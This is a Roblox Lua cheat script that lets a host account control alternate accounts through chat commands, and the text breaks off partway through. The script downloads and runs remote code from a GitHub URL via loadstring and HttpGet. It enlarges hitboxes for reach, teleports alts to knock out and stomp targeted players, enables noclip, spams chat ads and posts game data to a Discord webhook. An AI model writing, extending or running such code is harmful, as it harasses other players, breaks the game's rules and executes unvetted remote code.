-- removed the whitelist part.

getgenv().Settings = {
    Host = 12346789,
    Prefix = '.',
    FPS = 5,
    BlackScreen = true,
    AdMessage = 'YoMomma',
    Webhook = 'DISCORD_WEBHOOK_HERE',
}
getgenv().Alts = { -- 38+ max alts
    12346789, -- Crasher/bringer/stomper
    12346789, -- Crasher
    12346789, -- Crasher
    12346789,
}

if not game:IsLoaded() then
	game.Loaded:Wait()
end

local player = game.Players.LocalPlayer
local operator = false

local function LOWGFX()
    settings().Physics.PhysicsEnvironmentalThrottle = 1
    settings().Rendering.QualityLevel = 'Level01'
    for i,v in pairs(game:GetDescendants()) do
        if v:IsA("Part") then
            v.Material = Enum.Material.Plastic
        elseif v:IsA("Decal") then
            v:Destroy()
        elseif v:IsA("Texture") then
            v:Destroy()
        end
    end
end

local function formatnum(num)
    return tostring(num):reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end

game.Players.LocalPlayer.Idled:Connect(function()
    game:GetService("VirtualUser"):Button2Down(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
    wait(1)
    game:GetService("VirtualUser"):Button2Up(Vector2.new(0,0),game.Workspace.CurrentCamera.CFrame)
end)

if player.UserId ~= Settings['Host'] then
    setfpscap(Settings["FPS"])
    LOWGFX()
    if Settings['BlackScreen'] == true then
        local ScreenGui = Instance.new("ScreenGui")
        local Frame = Instance.new("Frame")
        local TextLabel = Instance.new("TextLabel")
        local TextLabel_2 = Instance.new("TextLabel")
        local TextLabel_3 = Instance.new("TextLabel")
        local TextLabel_4 = Instance.new("TextLabel")
        ScreenGui.Parent = game.CoreGui
        ScreenGui.Name = "YOMOMMAFAT"
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    
        Frame.Parent = ScreenGui
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
        Frame.BorderSizePixel = 100
        Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
        Frame.Size = UDim2.new(1, 0, 1, 0)
    
        TextLabel.Parent = Frame
        TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel.BackgroundTransparency = 1.000
        TextLabel.Position = UDim2.new(0.437655866, 0, 0.201503754, 0)
        TextLabel.Size = UDim2.new(0, 200, 0, 50)
        TextLabel.Font = Enum.Font.GothamSemibold
        TextLabel.Text = "V2"
        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel.TextSize = 55.000
    
        TextLabel_2.Parent = Frame
        TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_2.BackgroundTransparency = 1.000
        TextLabel_2.Position = UDim2.new(0.437655866, 0, 0.317293257, 0)
        TextLabel_2.Size = UDim2.new(0, 200, 0, 50)
        TextLabel_2.Font = Enum.Font.GothamSemibold
        TextLabel_2.Text = "Name"
        TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_2.TextSize = 30.000
    
        TextLabel_3.Parent = Frame
        TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_3.BackgroundTransparency = 1.000
        TextLabel_3.Position = UDim2.new(0.437655866, 0, 0.443608999, 0)
        TextLabel_3.Size = UDim2.new(0, 200, 0, 50)
        TextLabel_3.Font = Enum.Font.GothamSemibold
        TextLabel_3.Text = "$0"
        TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_3.TextSize = 30.000
    
        TextLabel_4.Parent = Frame
        TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_4.BackgroundTransparency = 1.000
        TextLabel_4.Position = UDim2.new(0.437655866, 0, 0.547368407, 0)
        TextLabel_4.Size = UDim2.new(0, 200, 0, 50)
        TextLabel_4.Font = Enum.Font.GothamSemibold
        TextLabel_4.Text = "This script increases CPU and GPU preformances."
        TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel_4.TextSize = 30.000
    
        -- Scripts:
    
        local function XKYQQQQ_fake_script() -- TextLabel_2.LocalScript 
            local script = Instance.new('LocalScript', TextLabel_2)
    
            script.Parent.Text = game.Players.LocalPlayer.Name
        end
        coroutine.wrap(XKYQQQQ_fake_script)()
        local function MQUQD_fake_script() -- TextLabel_3.LocalScript 
            local script = Instance.new('LocalScript', TextLabel_3)
            
            repeat wait() until game.Workspace.Players:FindFirstChild(game.Players.LocalPlayer.Name)
            script.Parent.Text = "$"..formatnum(game.Players.LocalPlayer.DataFolder.Currency.Value)
            game.Players.LocalPlayer.DataFolder.Currency.Changed:Connect(function()
                script.Parent.Text = "$"..formatnum(game.Players.LocalPlayer.DataFolder.Currency.Value)
            end)
        end
        coroutine.wrap(MQUQD_fake_script)()
    end
else
    operator = true
    LOWGFX()
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/8gHW/MJA31/main/ac.lua"))()

local LOCATIONS_CHACHE = {
    OLD_HIDESPOT = nil,
}

local Toggles = {
    Dropping = false,
    Blocking = false,
    CustomDropping = false,
    KNOCKING = false,
    DestroyCash = false,
    Advertising = false,
    Cashauraing = false,
    Noclipping = false,
}

game:GetService("RunService").Stepped:Connect(function()
    if Toggles['Dropping'] == true then
        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
    end
    if Toggles['Blocking'] == true then
        game.ReplicatedStorage.MainEvent:FireServer("Block",true)
    end
    if Toggles['Cashauraing'] == true then
        for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
            if v:IsA("Part") and (v.Position-player.Character.HumanoidRootPart.Position).Magnitude <= 15 then
                fireclickdetector(v:FindFirstChild("ClickDetector"))
            end
        end
    end
end)

local function GetPredropped()
    local amt = 0
    for i,v in pairs(workspace.Ignored.Drop:GetChildren()) do
        if v:IsA("Part") and v.Parent.Name == "Drop" then
            local txt = v:FindFirstChildWhichIsA("BillboardGui"):FindFirstChildWhichIsA("TextLabel")
            if txt.Text then
                txt.Text = string.gsub(txt.Text,"%,","")
                txt.Text = string.gsub(txt.Text,"%$","")
                amt = amt + tonumber(txt.Text)
            end
        end
    end
    return amt
end

local function tablelen(TABLE_)
    local amt = 0
    for i,v in pairs(TABLE_) do
        amt = amt + 1
    end
    return amt
end

local function CheckPlr(userId)
    for i,v in pairs(game.Players:GetChildren()) do
        if v.UserId == tonumber(userId) then
            return true
        end
    end
    return false
end

local function CheckPlr2(arg)
    for i,v in pairs(game.Players:GetChildren()) do
        if (string.sub(string.lower(v.Name),1,string.len(arg))) == string.lower(arg) then
            return v.Name
        end
        if (string.sub(string.lower(v.DisplayName),1,string.len(arg))) == string.lower(arg) then
            return v.Name
        end
    end
    return nil
end

local function saymsg(msg)
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, 'All')
end

local function FormatAlts()
    local new = {}
    for i,v in pairs(Alts) do
        if CheckPlr(v) == true then
            table.insert(new,tonumber(v))
        end
    end
    return new
end

local handSize
local originFall
coroutine.resume(coroutine.create(function()
    repeat wait() until workspace.Players:FindFirstChild(player.Name)
    handSize = player.Character:FindFirstChild("RightHand").Size
    originFall = player.Character.Animate.fall.FallAnim.AnimationId
end))
local function reach(boolean)
    if boolean == true then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if string.find(v.Name,"Hand") then
                pcall(function()
                    v.Massless = true
                    v.Size = Vector3.new(20,20,20)
                    v.Transparency = .99
                    v.CanCollide = true
                end)
            end
        end
    elseif boolean == false then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
            if string.find(v.Name,"Hand") then
                pcall(function()
                    v.Massless = false
                    v.Size = handSize
                    v.Transparency = 0
                    v.CanCollide = false
                end)
            end
        end
    end
end

local function KnockPlr(plr_name)
    local data = CheckPlr2(plr_name)
    if data == nil then
        return false
    end
    local Target = game.Players[data]
    if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == false then
        local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        repeat
            pcall(function()
                reach(true)
                local combat = game.Players.LocalPlayer.Character:FindFirstChild("Combat") or game.Players.LocalPlayer.Backpack:FindFirstChild("Combat")
                if combat then
                    if KNOCKING == false then
                        reach(false)
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                        return false
                    end
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Combat") then
                        game.Players.LocalPlayer.Backpack:FindFirstChild("Combat").Parent = game.Players.LocalPlayer.Character
                    end
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame + Vector3.new(0,5,0)
                    game.Players.LocalPlayer.Character:FindFirstChild("Combat"):Activate()
                end
            end)
            wait(0.01)
        until Target.Character.BodyEffects:FindFirstChild("K.O").Value == true
        reach(false)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
        return Target.Name
    end
    return false
end

local locations_setup = {
    Bank = {"-388,21,-336","-388,21,-327","-388,21,-318","-388,21,-309","-388,21,-300","-388,21,-291","-388,21,-282","-388,21,-273","-388,21,-264","-388,21,-255","-388,21,-246","-388,21,-237","-388,21,-228","-375,21,-336","-375,21,-327","-375,21,-318","-375,21,-309","-375,21,-300","-375,21,-291","-375,21,-282","-375,21,-273","-375,21,-264","-375,21,-255","-375,21,-246","-375,21,-237","-375,21,-228","-360,21,-336","-360,21,-327","-360,21,-318","-360,21,-309","-360,21,-300","-360,21,-291","-360,21,-282","-360,21,-273","-360,21,-264","-360,21,-255","-360,21,-246","-360,21,-237","-360,21,-228"},
    Club = {"-282,-7,-348","-274,-7,-348","-266,-7,-348","-258,-7,-348","-250,-7,-348","-282,-7,-357","-274,-7,-357","-266,-7,-357","-258,-7,-357","-250,-7,-357","-282,-7,-362","-274,-7,-362","-266,-7,-362","-258,-7,-362","-250,-7,-362","-282,-7,-367","-274,-7,-367","-266,-7,-367","-258,-7,-367","-250,-7,-367","-282,-7,-372","-274,-7,-372","-266,-7,-372","-258,-7,-372","-250,-7,-372","-282,-7,-377","-274,-7,-377","-266,-7,-377","-258,-7,-377","-250,-7,-377","-282,-7,-382","-274,-7,-382","-266,-7,-382","-258,-7,-382","-250,-7,-382","-248,0,-342","-260,0,-341","-271,0,-341","-281,0,-341"},
    Train = {"553,35,-56","553,35,-66","553,35,-76","553,35,-86","553,35,-96","553,35,-106","568,35,-56","568,35,-66","568,35,-76","568,35,-86","568,35,-96","568,35,-106","688,35,-141","679,35,-141","670,35,-141","661,35,-141","652,35,-141","643,35,-141","634,35,-141","625,35,-141","616,35,-141","607,35,-141","688,35,-156","679,35,-156","670,35,-156","661,35,-156","652,35,-156","643,35,-156","634,35,-156","625,35,-156","616,35,-156","607,35,-156","586,34,-142","579,34,-135","566,34,-122","572,34,-115","583,34,-127","593,34,-138"},
    Admin = {"-826,-40,-617","-826,-40,-605","-826,-40,-593","-826,-40,-581","-826,-40,-569","-826,-40,-557","-845,-40,-617","-845,-40,-605","-845,-40,-593","-845,-40,-581","-845,-40,-569","-845,-40,-557","-864,-40,-617","-864,-40,-605","-864,-40,-593","-864,-40,-581","-864,-40,-569","-864,-40,-557","-879,-40,-617","-879,-40,-605","-879,-40,-593","-879,-40,-581","-879,-40,-569","-879,-40,-557","-898,-40,-617","-898,-40,-605","-898,-40,-593","-898,-40,-581","-898,-40,-569","-898,-40,-557","-918,-40,-617","-918,-40,-605","-918,-40,-593","-918,-40,-581","-918,-40,-569","-918,-40,-557","-816,-33,-643","-927,-33,-642","-873,-33,-521"},
}

local TPAREAS = {
    Admin = "-871,-33,-662",
    Bank = "-377,21,-361",
    Club = "-266,0,-428",
    Train = "600,47,-117",
}

local PresentSetups = {
    SurroundSetup = {"4.5,0,0","0,0,4.5","-4.5,0,0","0,0,-4.5","3,0,3","-3,0,3","-3,0,-3","3,0,-3","6.5,0,0","5,0,3","3.5,0,5","0,0,6.5","-5,0,3","-3.5,0,5","-6.5,0,0","-5,0,-3","-3.5,0,-5","0,0,-6.5","5,0,-3","3.5,0,-5","4.5,7,0","0,7,4.5","-4.5,7,0","0,7,-4.5","3,7,3","-3,7,3","-3,7,-3","3,7,-3","6.5,7,0","5,7,3","3.5,7,5","0,7,6.5","-5,7,3","-3.5,7,5","-6.5,7,0","-5,7,-3","-3.5,7,-5","0,7,-6.5","5,7,-3","3.5,7,-5"},
    HeartSetup = {"15,0,0","19,0,2.3","23,0,4.6","27,0,6.9","29,0,11","30.5,0,16.6","29.5,0,22.1","27,0,27.6","22,0,33.1","17,0,35","12,0,33.4","7,0,30","2,0,25.6","-3,0,21.2","-8,0,16.8","-13,0,12.4","-18,0,7","-23,0,3","-29,0,0","19,0,-2.3","23,0,-4.6","27,0,-6.9","29,0,-11","30.5,0,-16.6","29.5,0,-22.1","27,0,-27.6","22,0,-33.1","17,0,-35","12,0,-33.4","7,0,-30","2,0,-25.6","-3,0,-21.2","-8,0,-16.8","-13,0,-12.4","-18,0,-7","-23,0,-3","45,0,0","45,0,16.6","45,0,-16.6"},
    DiamondSetup = {"0,0,15","5,0,15","-5,0,15","10,0,15","-10,0,15","15,0,15","-15,0,15","20,0,15","-20,0,15","-25,0,12","25,0,12","-30,0,8","30,0,8","-35,0,4","35,0,4","-32,0,0","32,0,0","-29,0,-4","29,0,-4","-26,0,-8","26,0,-8","-23,0,-12","23,0,-12","-20,0,-16","20,0,-16","-17,0,-20","17,0,-20","-14,0,-24","14,0,-24","-11,0,-28","11,0,-28","-8,0,-32","8,0,-32","-5,0,-36","5,0,-36","-2,0,-40","2,0,-40","15,0,0","-15,0,0"},
    HorizontalLine = {"8,0,0","-8,0,0","16,0,0","-16,0,0","24,0,0","-24,0,0","32,0,0","-32,0,0","40,0,0","-40,0,0","48,0,0","-48,0,0","56,0,0","-56,0,0","64,0,0","-64,0,0","72,0,0","-72,0,0","80,0,0","-80,0,0","88,0,0","-88,0,0","96,0,0","-96,0,0","104,0,0","-104,0,0","112,0,0","-112,0,0","120,0,0","-120,0,0","128,0,0","-128,0,0","136,0,0","-136,0,0","144,0,0","-144,0,0","152,0,0","-152,0,0","160,0,0","-160,0,0"},
}

local function SetupArea(area)
    local cords = locations_setup[area]
    local newalts = FormatAlts()
    local index = 0
    for i,v in pairs(newalts) do
        if v == player.UserId then
            index = index + 1
            local x,y,z = string.split(cords[index],",")[1],string.split(cords[index],",")[2],string.split(cords[index],",")[3]
            player.Character.HumanoidRootPart.CFrame = CFrame.new(x,y,z)
        else
            index = index + 1
        end
    end
end

local function Surronund(PLRNAME)
    local data = CheckPlr2(PLRNAME)
    if data then
        local newalts = FormatAlts()
        local index = 0
        local Target = game.Players[data]
        for i,v in pairs(newalts) do
            if v == player.UserId then
                index = index + 1
                local cords = PresentSetups['SurroundSetup'][index]
                local x,y,z = string.split(cords,",")[1],string.split(cords,",")[2],string.split(cords,",")[3]
                player.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.HumanoidRootPart.CFrame.X+tonumber(x),Target.Character.HumanoidRootPart.CFrame.Y+tonumber(y),Target.Character.HumanoidRootPart.CFrame.Z+tonumber(z))
            else
                index = index + 1
            end
        end
    else
        return false
    end
end

local function PresentSetupLOL(model_type,name_target)
    if model_type == "HorizontalLine" then
        local place = PresentSetups[model_type]
        local index = 0
        local target = game.Players[name_target]
        local newalts = FormatAlts()
        for i,v in pairs(newalts) do
            if v == player.UserId then
                index = index + 1
                local cords = place[index]
                local x = string.split(place[index],",")[1]
                player.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame*CFrame.new(x,0,0)
            else
                index = index + 1
            end
        end
    else
        local place = PresentSetups[model_type]
        local index = 0
        local target = game.Players[name_target]
        local newalts = FormatAlts()
        for i,v in pairs(newalts) do
            if v == player.UserId then
                index = index + 1
                local cords = place[index]
                local x,y,z = string.split(cords,",")[1],string.split(cords,",")[2],string.split(cords,",")[3]
                player.Character.HumanoidRootPart.CFrame = CFrame.new(target.Character.HumanoidRootPart.CFrame.X+tonumber(x),target.Character.HumanoidRootPart.CFrame.Y+tonumber(y),target.Character.HumanoidRootPart.CFrame.Z+tonumber(z))
            else
                index = index + 1
            end
        end
    end
end

local function StringSplitter(arg)
    local t = {}
    for i=1,string.len(arg) do
        table.insert(t,string.sub(arg,i,i))
    end
    return t
end

local function SignGetter(arg)
    arg = string.reverse(arg)
    local data = StringSplitter(arg)
    return data[1]
end

local function calculator(arg,sign)
    arg = string.lower(arg)
    local table_data = StringSplitter(arg)
    local index = 0
    for i,v in pairs(StringSplitter(arg)) do
        index = index + 1
    end
    table.remove(table_data,index)
    arg = ""
    for i,v in pairs(table_data) do
        arg = arg..""..v
    end
    if string.lower(sign) == "k" then
        return tonumber(arg)*1000
    elseif string.lower(sign) == "m" then
        return tonumber(arg)*1000000
    elseif string.lower(sign) == "b" then
        return tonumber(arg)*1000000000
    else
        return tonumber(arg)
    end
end

local function CustomDropCash(prearg,amt)
    if Toggles['CustomDropping'] == true then
        saymsg("Dropping -> "..prearg)
        repeat
            if Toggles['CustomDropping'] == false then return end
            game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
            wait()
        until Toggles['CustomDropping'] == false or GetPredropped() >= amt
        if GetPredropped() >= amt then
            saymsg("Finished dropping -> "..prearg)
        end
    end
end

workspace.Ignored.Drop.DescendantAdded:Connect(function(v)
    wait(2)
    if Toggles['DestroyCash'] == true then
        if v:IsA("Part") then
            v.Transparency = 1
            v.CanCollide = false
        elseif v:IsA("BillboardGui") then
            v.Active = false
        elseif v:IsA("TextLabel") then
            v.Active = false
            v.TextTransparency = 1
        elseif v:IsA("Decal") then
            v:Destroy()
        end
    end
end)

local function CreateGroundPart()
    local Name = tostring(math.random(9,999)).."GROUND"
    local Part = Instance.new("Part",workspace)
    Part.Name = Name
    Part.Size = Vector3.new(60,2,60)
    Part.Transparency = 1
    return Name
end

game:GetService("RunService").Stepped:Connect(function()
    if Toggles['Noclipping'] == true then
        for i,v in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
            if v:IsA("BasePart") and v.CanCollide == true then
                v.CanCollide = false
            end
        end
    end
end)

local function cmds(msg,plr)
    if operator == false or plr == Settings['Host'] then
        local op = game.Players:GetPlayerByUserId(plr)
        if not operator then
            if string.lower(msg) == Settings['Prefix'].."bring" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = op.Character.HumanoidRootPart.CFrame+op.Character.HumanoidRootPart.CFrame.lookVector*3.5
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.Angles(0, math.rad(180), 0)
            elseif string.lower(msg) == Settings['Prefix'].."hide" then
                LOCATIONS_CHACHE['OLD_HIDESPOT'] = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-163,54,216)
            elseif string.lower(msg) == Settings['Prefix'].."unhide" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = LOCATIONS_CHACHE['OLD_HIDESPOT']
            elseif string.lower(msg) == Settings['Prefix'].."reset" then
                for i,v in pairs(player.Character:GetChildren()) do
                    if string.find(v.Name,"Humanoid") or v:IsA("MeshPart") then
                        v:Destroy()
                    end
                end
            elseif string.lower(msg) == Settings['Prefix'].."drop" then
                Toggles['Dropping'] = true
                Toggles['Blocking'] = true
            elseif string.lower(msg) == Settings['Prefix'].."stop" then
                Toggles['Dropping'] = false
                Toggles['Blocking'] = false
                Toggles['KNOCKING'] = false
                Toggles['Cashauraing'] = false
                Toggles['CustomDropping'] = false
                wait(0.5)
                for i=1,10 do
                    wait()
                    game.ReplicatedStorage.MainEvent:FireServer("Block",false)
                end
            elseif string.lower(msg) == Settings['Prefix'].."under" then
                local part = CreateGroundPart()
                Toggles['Noclipping'] = true
                workspace:FindFirstChild(part).CFrame = player.Character.HumanoidRootPart.CFrame-Vector3.new(0,11,0)
                workspace:FindFirstChild(part).Anchored = true
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame-Vector3.new(0,5,0)
                wait(5)
                player.Character.HumanoidRootPart.Anchored = true
            elseif string.lower(msg) == Settings['Prefix'].."above" then
                Toggles['Noclipping'] = true
                player.Character.HumanoidRootPart.Anchored = false
                player.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame + Vector3.new(0,8,0)
                for i,v in pairs(workspace:GetChildren()) do
                    if v:IsA("Part") and string.find(v.Name,"GROUND") then
                        v:Destroy()
                    end
                end
            elseif string.lower(msg) == Settings['Prefix'].."vibe" then
                local Dance = Instance.new("Animation")
                Dance.Parent = player.Character
                Dance.Name = "NeverGonnaGiveYouUp"
                Dance.AnimationId = "rbxassetid://3189773368"
                player.Character.Humanoid:LoadAnimation(Dance):Play()
            elseif string.lower(msg) == Settings['Prefix'].."unvibe" then
                for i,v in pairs(player.Character.Humanoid:GetPlayingAnimationTracks()) do
                    if v.Name == "NeverGonnaGiveYouUp" then
                        v:Stop()
                    end
                end
            elseif string.lower(msg) == Settings['Prefix'].."ad" then
                Toggles['Advertising'] = true
                while Toggles['Advertising'] == true do
                    wait()
                    saymsg(Settings['AdMessage'])
                end
            elseif string.lower(msg) == Settings['Prefix'].."unad" then
                Toggles['Advertising'] = false
            elseif string.lower(msg) == Settings['Prefix'].."wallet" then
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet") then
                    game.Players.LocalPlayer.Backpack:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Character
                end
            elseif string.lower(msg) == Settings['Prefix'].."unwallet" then
                if game.Players.LocalPlayer.Character:FindFirstChild("Wallet") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Wallet").Parent = game.Players.LocalPlayer.Backpack
                end
            elseif string.lower(msg) == Settings['Prefix'].."destroy" then
                Toggles['DestroyCash'] = true
                for i,v in pairs(workspace.Ignored.Drop:GetDescendants()) do
                    if v:IsA("Part") then
                        v.Transparency = 1
                        v.CanCollide = false
                    elseif v:IsA("BillboardGui") then
                        v.Active = false
                    elseif v:IsA("TextLabel") then
                        v.Active = false
                        v.TextTransparency = 1
                    elseif v:IsA("Decal") then
                        v:Destroy()
                    end
                end
            elseif string.lower(msg) == Settings['Prefix'].."undestroy" then
                Toggles['DestroyCash'] = false
            elseif string.lower(msg) == Settings['Prefix'].."airlock" then
                
                local Part = Instance.new("Part",workspace)
                Part.Name = "IFUCKMYSELF"
                Part.Size = Vector3.new(10,2,10)
                Part.CFrame = player.Character.HumanoidRootPart.CFrame+Vector3.new(0,7,0)
                Part.Anchored = true
                Part.Transparency = 1
                player.Character.Animate.fall.FallAnim.AnimationId = "rbxassetid://616006778"
                player.Character.HumanoidRootPart.CFrame=player.Character.HumanoidRootPart.CFrame+Vector3.new(0,9,0)
                wait(1.5)
                player.Character.HumanoidRootPart.Anchored = true
                wait(.5)
                Part:Destroy()
            elseif string.lower(msg) == Settings['Prefix'].."lock" then
                player.Character.HumanoidRootPart.Anchored = true
            elseif string.lower(msg) == Settings['Prefix'].."unlock" then
                player.Character.Animate.fall.FallAnim.AnimationId = originFall
                player.Character.HumanoidRootPart.Anchored = false
            elseif string.lower(msg) == Settings['Prefix'].."infosend" then
                local S_SENDER = CheckPlr(Alts[1])
                if S_SENDER then
                    local s,e = pcall(function()
                        local ping = "**Ping:** "..tostring(tonumber(math.floor(string.split(game:GetService("Stats").Network.ServerStatsItem:FindFirstChild("Data Ping"):GetValueString(),"(")[1]))).."ms"
                        local CashPot = 0
                        local Predropped = "**Predropped:** $"..formatnum(GetPredropped())
                        local Alts_ = ""
                        local Players = ""
        
                        local cur_plrs = 0
                        for i,v in pairs(game.Players:GetChildren()) do
                            cur_plrs = cur_plrs + 1
                            if workspace.Players:FindFirstChild(v.Name) then
                                CashPot = CashPot + v.DataFolder.Currency.Value
                            end
                        end
                        CashPot = "**Cash Pot:** $"..formatnum(CashPot) 
                        Players = "**Players:** "..tostring(cur_plrs).."/40"
                        local curalts = 0
                        for i,v in pairs(Alts) do
                            if CheckPlr(v) == true then
                                curalts = curalts + 1
                            end
                        end
                        Alts_ = "**Alts:** "..tostring(curalts).."/"..tablelen(Alts)
                        local sender = syn.request or http_request or HttpPost
                        sender({
                            Url = Settings['Webhook'],
                            Body = game:GetService("HttpService"):JSONEncode({
                                content = "",
                                embeds = {
                                    {
                                        ['title'] = "Encrypt Alt Control!",
                                        ['description'] = ping.."\n"..CashPot.."\n"..Predropped.."\n"..Players.."\n"..Alts_,
                                        ['color'] = tonumber(0x6c00bd)
                                    }
                                }
                            }),
                            Method = "POST",
                            Headers = {
                                ["content-type"] = "application/json"
                            }
                        })
                    end)
                    if e then print(e) end
                    saymsg("Sent!")
                end
            elseif string.lower(msg) == Settings['Prefix'].."mask" then
                local mask = game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") or game.Players.LocalPlayer.Character:FindFirstChild("Mask")
                if not mask then
                    local origin = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                    repeat
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace.Ignored.Shop:FindFirstChild("[Surgeon Mask] - $25").Head.CFrame + Vector3.new(0,1.5,0)
                        fireclickdetector(workspace.Ignored.Shop:FindFirstChild("[Surgeon Mask] - $25").ClickDetector)
                        wait()
                    until game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") or game.Players.LocalPlayer.Character:FindFirstChild("Mask")
                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = origin
                end 
                if game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") and not game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask") then
                    game.Players.LocalPlayer.Backpack:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Character
                    game.Players.LocalPlayer.Character:FindFirstChild("Mask"):Activate()
                end
                if not game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask") then
                    game.Players.LocalPlayer.Character:FindFirstChild("Mask"):Activate()
                end
                wait(2)
                if game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask") then
                    if game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask"):FindFirstChild("Handle") then
                        game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask"):FindFirstChild("Handle"):Destroy()
                    end
                end
                game.Players.LocalPlayer.Character:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Backpack
            elseif string.lower(msg) == Settings['Prefix'].."unmask" then
                if game.Players.LocalPlayer.Character:FindFirstChild("In-gameMask") then
                    if game.Players.LocalPlayer.Backpack:FindFirstChild("Mask") then
                        game.Players.LocalPlayer.Backpack:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Character
                    end
                    game.Players.LocalPlayer.Character:FindFirstChild("Mask"):Activate()
                    wait(2)
                    game.Players.LocalPlayer.Character:FindFirstChild("Mask").Parent = game.Players.LocalPlayer.Backpack
                end
            end
            msg = string.split(msg," ")
            msg[1] = string.lower(msg[1])
            if msg[1] == Settings['Prefix'].."setup" then
                if string.lower(msg[2]) == "admin" then
                    SetupArea("Admin")
                elseif string.lower(msg[2]) == "train" then
                    SetupArea("Train")
                elseif string.lower(msg[2]) == "club" then
                    SetupArea("Club")
                elseif string.lower(msg[2]) == "bank" then
                    SetupArea("Bank")
                end
            elseif msg[1] == Settings['Prefix'].."stomp" then
                if Alts[1] == player.UserId then
                    player.Character.HumanoidRootPart.Anchored = false
                    Toggles['KNOCKING'] = true
                    local KO_Data = KnockPlr(msg[2])
                    if KO_Data then
                        pcall(function()
                            Toggles['KNOCKING'] = false
                            local Target = game.Players[KO_Data]
                            if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == true then
                                local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                repeat
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.UpperTorso.Position.X,Target.Character.UpperTorso.Position.Y+1.3,Target.Character.UpperTorso.Position.Z)
                                    game.ReplicatedStorage.MainEvent:FireServer("Stomp")
                                    wait()
                                until Target.Character.BodyEffects:FindFirstChild("Dead").Value == true
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
                            end
                        end)
                    elseif KO_Data == false then
                        Toggles['KNOCKING'] = false
                    end
                end
            elseif msg[1] == Settings['Prefix'].."tp" then
                if player.UserId == Alts[1] then
                    player.Character.HumanoidRootPart.Anchored = false
                    local theplace = ""
                    if msg[3] == nil or string.lower(msg[3]) == "host" then
                        theplace = "HOST"
                    elseif string.lower(msg[3]) == "admin" then
                        theplace = "Admin"
                    elseif string.lower(msg[3]) == "train" then
                        theplace = "Train"
                    elseif string.lower(msg[3]) == "club" then
                        theplace = "Club"
                    elseif string.lower(msg[3]) == "bank" then
                        theplace = "Bank"
                    end
                    if theplace then
                        local ko_data = KnockPlr(msg[2])
                        if ko_data then
                            local Target = game.Players[ko_data]
                            local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                            if Target.Character and game.Players.LocalPlayer.Character and Target.Character.BodyEffects:FindFirstChild("Dead").Value == false and Target.Character.BodyEffects:FindFirstChild("K.O").Value == true then
                                repeat
                                    pcall(function()
                                        if not Target.Character:FindFirstChild("GRABBING_CONSTRAINT") then
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.UpperTorso.Position.X,Target.Character.UpperTorso.Position.Y+1.3,Target.Character.UpperTorso.Position.Z)
